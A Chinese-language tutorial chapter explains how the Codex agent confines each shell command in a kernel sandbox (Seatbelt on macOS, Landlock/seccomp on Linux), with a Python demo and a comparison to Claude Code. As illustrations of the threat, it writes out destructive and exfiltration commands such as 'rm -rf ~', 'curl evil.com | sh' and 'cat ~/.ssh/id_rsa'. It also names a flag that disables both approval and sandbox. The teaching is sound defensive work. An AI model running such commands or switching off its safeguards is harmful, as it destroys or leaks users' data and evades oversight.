# s05: Sandbox — 把每条命令关进内核沙箱

> *"Claude Code 在应用层挡，Codex 在内核层关。"*

[learn-codex 总览](../README.md) · 上一章：[s04 approval](../s04_approval/) → **s05** → 下一章：[s06 AGENTS.md](../s06_agents_md/)

---

## 先把思想说透：为什么真正的安全是"内核来关"，而不是"应用来挡"

这一章是整门课的脊梁。如果你只想记住一句话，就记这句：**Claude Code 在应用层"挡"，Codex 在内核层"关"。** 但光记这句没用，得想通它为什么成立。下面三个道理层层递进，想明白了，你就懂了为什么 Codex 敢在没人盯着的机器上跑。

**道理一：在"门里"自己看门，永远看不住。**
上一章（[s04]）我们用审批拦危险命令。但审批靠的是程序自己读一眼命令、判断"这条危不危险"——这相当于让**程序自己当门卫**。问题在于，命令的写法千变万化，而真正动手删文件的，根本不是那串命令文本，而是它启动的进程。模型完全可以写一句看着人畜无害的 `python build.py`，而 `build.py` 里偷偷 `os.remove` 了你的密钥。门卫检查的是"门口递进来的纸条"，可坏事是进门之后才干的——**只要执法点在程序内部，被它启动的子进程就有办法绕过它**。这就是"挡"的天花板：它拦的是文本，拦不住行为。

**道理二：把执法点搬到进程"够不着"的地方——操作系统内核。**
那把关卡设在哪才绕不过去？设在**比任何程序都低一层、由硬件和内核强制的地方**。你的进程想写文件、想联网，最终都得向操作系统**请求**；操作系统完全可以直接回一句"不行"。这就是沙箱：在启动命令**之前**，先告诉内核"接下来这个进程，只准写这一个文件夹，别的一律拒"。之后无论这个进程怎么折腾、怎么 fork 子进程、用什么语言写脚本，**每一次写越界的文件,都是内核当场驳回**——不是程序"决定不让"，是它**根本碰不到**。
打个比方：审批是大楼前台让访客签到（前台可能被花言巧语骗过、可能漏看），沙箱是直接给这间办公室换一把**物理门锁**——你没有那把钥匙，再能说会道也开不了门。门卫会犯错，锁不会。

**道理三：默认全关，再一条条放开——而不是默认全开，再一条条堵。**
最后一个巧思在"基线"的选法。黑名单的思路是"默认允许，遇到坏的才堵"（堵不完）。沙箱反过来：**`(deny default)`——默认什么都不许，然后只把这次任务**真正需要**的最小权限显式放开**（读可以到处读，但写只准落在工作区里）。这一反转的威力在于：你**忘了堵某个危险操作**会出事，但你**忘了放开某个权限**最多是命令报个错——失败的方向是安全的。安全系统就该这样：默认拒绝，让"漏"变成"卡一下"，而不是"出事"。

把三点连起来：应用层的门卫拦得了文本、拦不住行为（道理一），所以要把执法点下沉到进程绕不过的内核（道理二），并且从"默认全拒"起步、只放开最小必要（道理三）。正因为这道关**独立于人、也独立于模型有没有犯傻**，Codex 才敢在 `codex exec` 无头模式、云端 agent 这些**没人审批**的场景里放手让它跑。

## 问题

agent 会跑任意命令。模型一旦失误（或被注入的恶意指令诱导），一句 `rm -rf ~` 或 `curl evil | sh` 就能酿成灾难。

应用层黑名单挡得住吗？挡不住。命令的变体是无穷的：`rm -rf ~`、`rm -fr $HOME`、`find ~ -delete`、一个删文件的 Python 脚本……你永远列不全。

Codex 的答案：**不要试图枚举坏命令，而是从源头限制命令"能碰到什么"——用操作系统内核强制隔离。**

## 解决方案

在 macOS 上用 **Seatbelt**（`/usr/bin/sandbox-exec`）。策略从 `(deny default)`（默认全部拒绝）起步，再逐条放开最小必要权限：读可以到处读，**写只允许落在"可写根"里**。

```
sandbox-exec  -p '(version 1)
                  (deny default)            ← 关键：默认全拒
                  (allow process-exec)
                  (allow file-read*)        ← 读放开
                  (allow file-write* (subpath (param "WRITABLE_ROOT_0")))'
              -D WRITABLE_ROOT_0=/path/to/workspace   ← 可写根用参数注入
              -- /bin/sh -c "<命令>"
```

这忠实对应真源码：可执行路径 `MACOS_PATH_TO_SEATBELT_EXECUTABLE = "/usr/bin/sandbox-exec"`、`(deny default)` 基线（[seatbelt_base_policy.sbpl](../../codex/codex-rs/sandboxing/src/seatbelt_base_policy.sbpl)）、可写根用 `-D` 注入 `(param ...)`（`seatbelt.rs:602 create_seatbelt_command_args`）。

Linux 上 Codex 换用 **Landlock + seccomp**（或 bubblewrap），见 `codex-rs/linux-sandbox`。本章 demo 在非 macOS 上会退回无沙箱执行并提示。

## 工作原理

看 [code.py](code.py)：

```python
def build_seatbelt_policy(n_writable_roots):
    lines = ["(version 1)", "(deny default)", "(allow process-exec)",
             "(allow file-read*)", ...]
    for i in range(n_writable_roots):
        lines.append(f'(allow file-write* (subpath (param "WRITABLE_ROOT_{i}")))')
    return "\n".join(lines)

def run_sandboxed(command, writable_roots):
    args = ["/usr/bin/sandbox-exec", "-p", policy]
    for i, root in enumerate(roots):
        args += ["-D", f"WRITABLE_ROOT_{i}={root}"]
    args += ["--", "/bin/sh", "-c", command]
    return subprocess.run(args, ...)
```

然后 s01 的 `run_shell` 改成调用 `run_sandboxed(command, writable_roots=[WORKDIR])`——agent 跑的每条命令都被关进工作区。

**走一遍** — 拿一条想"越狱"的命令，看内核怎么当场驳回它。工作区设为 `.../sandbox_demo`，现在让 agent 跑一句想往 home 目录写文件的命令：

```bash
touch /Users/ze/codex_escape_test.txt
```

第一步，`build_seatbelt_policy(1)` 拼出一份策略文本——注意它从 `(deny default)` 起步，只显式放开读和"写进工作区"：

```text
(version 1)
(deny default)                ← 默认全拒
(allow process-exec)
(allow file-read*)            ← 读放开
(allow file-write* (subpath (param "WRITABLE_ROOT_0")))   ← 写只准落在工作区
```

第二步，`run_sandboxed` 把这份策略、用 `-D` 注入的可写根、以及命令本身拼成一条真正交给内核的 `sandbox-exec` 调用：

```text
/usr/bin/sandbox-exec -p '<上面那份策略>' \
  -D WRITABLE_ROOT_0=/Users/.../sandbox_demo \
  -- /bin/sh -c "touch /Users/ze/codex_escape_test.txt"
```

第三步，命令真的跑起来了，`touch` 进程也真的尝试写那个 home 路径——但目标在工作区之外，不匹配任何 `file-write*` 规则，于是落进 `(deny default)`，**内核当场把这次写系统调用驳回**：

```text
[exit 1] touch: /Users/ze/codex_escape_test.txt: Operation not permitted
实际检查：/Users/ze/codex_escape_test.txt 存在吗？ -> False
```

这就是"关"与"挡"的区别落到实处：不是我们的 Python 代码读了命令、判断"这条想越界、我不让它跑"——命令**照跑不误**，是它发出的写操作被**内核**拒绝了，文件**根本没被创建**。换一句更刁钻的写法（比如塞进一个 Python 脚本里去 `os.remove`）也一样：只要那个进程没有写工作区外的权限，它就是碰不到。

`--demo` 直接演示：写工作区内成功，写 home 目录被内核拒绝（`Operation not permitted`），且那个文件**确实没被创建**。

## 生产级：一道真沙箱，严在四个"默认"上

教学版的 8 行策略够你看懂"关"的形状；但一道**能上生产**的沙箱，狠在它的几个默认值都朝"安全"那边倒——正是这几点让 Codex 敢在无人值守时放手跑。（行号级细节在下面「深入」逐条展开，这里先把原则立住。）

- **默认全拒（deny default），失败朝安全的方向倒。** 策略起手就是 `(deny default)`，之后**只**逐条放行必需的。妙在**失败方向**：你忘了放行某权限，顶多命令报错（烦，但安全）；黑名单式的"默认放行、列举坏的"一旦漏列一条，就是一次真实越界。`--demo` 现在会把生成的策略打印出来，你能**数清**到底放行了哪几条。
- **默认禁网。** 通篇策略没有一条 `network-*` 允许 → 出网被内核挡死。这拦的不是"写越界"，而是**外传**：哪怕模型 `curl evil.com | sh` 或想把密钥 POST 出去，连接根本建不起来。要联网得走**显式代理 + unix-socket 白名单**（真源码 `seatbelt_network_policy.sbpl` + `NetworkProxy`），而不是开个口子。
- **读 ≠ 写，且读也不全开。** 教学版图省事 `(allow file-read*)`；真 Codex 还有 `unreadable_roots` / `restricted_read_only_platform_defaults.sbpl`，把密钥这类敏感路径连**读**都挡掉——别让 agent 随手 `cat` 走你的 `~/.ssh`。
- **逐条决定关不关、关哪种，而非一刀切。** 真 Codex 按"这条命令 + 审批结论 + 平台"逐条挑：macOS 用 Seatbelt、Linux 用 Landlock+seccomp（退而 `bwrap`）、Windows 用受限令牌（`SandboxType` 四变体）；被 execpolicy 显式 allow 的命令还能 `bypass_sandbox` 直接跑（审批与沙箱正交，[s04]）。

> 一句话：**把"安全"做成默认值、把"放行"做成例外，并让每一个默认都朝"出错也不闯祸"的方向倒。** 下面「深入」把这四点对到真源码的行号上。

## 🆚 与 Claude Code 的不同

| | Claude Code | Codex |
|---|---|---|
| 主要防线 | 审批弹窗 + 工作区路径校验（**应用层**） | 内核强制沙箱（Seatbelt / Landlock，**内核层**） |
| 信任模型 | 信任模型 + 让用户把关 | 默认不信任，纵深防御 |
| 越界写 home | 靠工具代码里的路径检查拦 | 内核直接拒绝，连 `sandbox-exec` 外的子进程都跑不掉 |
| 适配场景 | 偏交互式、审批 UX 为中心 | 也适合低/无人工审批的 headless / CI / 云端 |

**为什么不同？** 根子在自主度与运行场景的设想：

- Codex 想在**几乎没有人盯着**的情况下也安全运行（`codex exec` 无头模式、云端 agent）。没人审批时，唯一可靠的防线就是把安全**下沉到内核**——哪怕模型完全失控，内核也不放它越界。
- Claude Code 更以**交互式审批**为中心：危险操作弹窗问你，由人把最后一道关。

注意：两者**都有**审批机制（Codex 的审批策略是 [s04]，与沙箱正交）。差别在"第一道、且独立于人的防线"放在哪里——Codex 放在内核，这是它最鲜明的工程取向。

[s04]: ../s04_approval/

## 深入：教学版 vs 真 Codex 源码

教学版的 SBPL 策略就 8 行。真 Codex 的沙箱在 [`sandboxing/`](../../codex/codex-rs/sandboxing/) + [`linux-sandbox/`](../../codex/codex-rs/linux-sandbox/)，复杂得多。

<details>
<summary>一、真实 Seatbelt 策略有多大</summary>

`seatbelt_base_policy.sbpl` 基线就 **123 行**，之上还叠加网络策略（`seatbelt_network_policy.sbpl`）、unix socket 规则、可写根里的只读子路径排除、对 `.git` 等元数据的保护。`create_seatbelt_command_args`（`seatbelt.rs:602`）在运行时动态拼装这一切。

</details>

<details>
<summary>二、连"读"都不是全放开</summary>

教学版图省事 `(allow file-read*)` 全放开读。真 Codex 支持 `unreadable_roots`、`restricted_read_only_platform_defaults.sbpl`，对敏感路径限制读取——别让 agent 随手 `cat` 走你的密钥。

</details>

<details>
<summary>三、Linux 走完全不同的一套</summary>

macOS 是 Seatbelt；**Linux 用 Landlock（LSM）+ seccomp** 过滤系统调用，或退回 bubblewrap(`bwrap`)。见 `linux-sandbox/` 与 `sandboxing/src/landlock.rs`、`bwrap.rs`。`SandboxType` 枚举：`None / MacosSeatbelt / LinuxSeccomp / WindowsRestrictedToken`——同一套审批策略，四种内核实现。

</details>

<details>
<summary>四、网络也被关在门外</summary>

教学版只管文件写。真 Codex 的网络沙箱**默认禁止出网**，可按 host 精确放开，还有 MITM 代理可读根等机制。这样即便模型想 `curl evil.com | sh`，连接本身就建立不起来。

</details>

<details>
<summary>五、沙箱与审批怎么衔接：bypass_sandbox 与"逐条选沙箱"</summary>

教学版里"沙箱"是固定的一层——每条命令都用同一份策略 `run_sandboxed`。真 Codex 把"这条命令到底进不进沙箱、进哪种沙箱"做成了**逐条决策**，而且和上一章（[s04]）的审批结论是**联动**的：

- 审批裁决会包成 `ExecApprovalRequirement`（`core/src/tools/sandboxing.rs`）。其中 `Skip { bypass_sandbox, .. }` 这个分支里的 `bypass_sandbox` 字段，决定了一条被 execpolicy **显式 allow** 的命令可以**完全跳过沙箱**直接跑——这正是"审批与沙箱正交"在类型层面的落点：批准只是放它进门，是否还套一层内核约束是另一个独立开关。
- 具体套哪种内核实现由 `SandboxType` 决定（`None / MacosSeatbelt / LinuxSeccomp / WindowsRestrictedToken`），运行时按平台选；可写根、网络放行、只读排除等都在这一步动态拼进策略。
- 还有一条"全都不要"的逃生口：`--dangerously-bypass-approvals-and-sandbox`（俗称 YOLO 模式）会**同时**关掉审批和沙箱。它存在是为了某些可信的自动化场景，但等于把这一章和上一章的两道防线一起拆了——只应在你完全清楚后果时使用。

一句话：教学版是"一刀切地都进同一个沙箱"，真 Codex 是"**按命令、按审批结论、按平台**，逐条决定关不关、关哪种"。

</details>

## 运行

```bash
python s05_sandbox/code.py --demo   # 不需要模型：打印生成的策略 + 演示「区内放行 / 区外拦截」
python s05_sandbox/code.py          # 交互模式：shell 命令都被沙箱关在工作区
```

> macOS 会打印 `sandbox-exec: ... is deprecated` 的告警——这是系统提示，功能仍然有效，真 Codex 也照用不误。demo 跑完会**自动清理** `sandbox_demo/` 工作区（和其余各章一致）。

## 小结

- **关 vs 挡**：应用层只能读命令文本来"挡"，拦得了文本拦不住行为（一句 `python x.py` 就能绕过）；内核层在进程绕不过的地方"关"，命令照跑、越界操作被内核当场驳回。
- 所以执法点要**下沉到内核**：不枚举坏命令，而是从源头限制命令"能碰到什么"。
- 基线选 `(deny default)`——默认全拒、只放开最小必要（读放开，写仅限可写根）。妙在**失败的方向是安全的**：忘了放开权限顶多命令报错，忘了堵危险操作才会出事。
- 这道关**独立于人、也独立于模型有没有犯傻**，所以 Codex 才敢在无人审批的 headless / CI / 云端放手跑——这是它与 Claude Code 最鲜明的分野。
- 生产级看四个"默认"：默认全拒（fail-closed）、默认禁网、读≠写且读也设限、逐条选沙箱——**安全是默认值、放行是例外**（见「生产级」一节）。
- 下一站 [s06](../s06_agents_md/)：让项目把自己的规矩写进文件，agent 沿目录树分层读进来。
- 回到 [总览](../README.md) 看完整 17 章路线图。

## 思考

<div class="think">

1. 沙箱挡住了"写越界"，但模型若 `cat ~/.ssh/id_rsa` 把密钥打印到输出里，再设法外传呢？只靠文件沙箱够吗？还需要哪几层？
2. `(deny default)` 起步意味着每放开一项都得显式写规则——安全但很累。若某个正经命令因缺一条规则跑不起来，你会"再放开一点"还是"保持收紧"？依据是什么？
3. Claude Code 靠人审批、Codex 靠内核关。当 agent 要在**无人值守**的 CI 里跑时，这两条路谁更可信？为什么？
4. 沙箱（内核强制）和审批（人点头）是正交的两层。能不能只要其一？什么场景下你会同时关掉两者（`--dangerously-bypass`），又为什么这很危险？

</div>
